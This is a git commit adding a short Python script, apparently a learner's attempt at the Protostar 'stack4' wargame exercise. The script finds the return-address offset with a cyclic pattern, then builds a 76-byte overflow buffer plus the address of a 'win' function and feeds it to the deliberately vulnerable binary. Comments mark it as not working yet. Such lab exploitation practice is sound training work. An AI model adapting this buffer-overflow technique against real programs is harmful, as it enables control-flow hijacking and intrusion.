e86c1e7e0cf3d2a436d1559036a9bfa94a21dc5a
Zuul-DCoS <zlawson@gmail.com>
2017-02-27 20:23:25 -0500

    Adding stack4 - not working yet

---
+++ stack4/stack4.py
@@ -0,0 +1,25 @@
+#!/usr/bin/python
+# GDB reports win located at 0x80483fa
+
+
+import commands
+
+# Path to binary
+command = '/opt/protostar/bin/stack4'
+
+# Pattern to find EIP - 128 bytes
+pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae'
+# EIP found at 0x63413563, or offset 76
+
+# Create new file write buffer to file
+file = open('buffer', 'w+')
+buffer = 'A'*76 + '\xfa\x83\x04\x08' # Doesn't work yet
+file.write(buffer)
+file.close()
+
+# String to execiute command and send buffer file as input
+line = command + " < buffer"
+
+# Execute the command with the current buffer
+output = commands.getoutput(line)
+print(output)
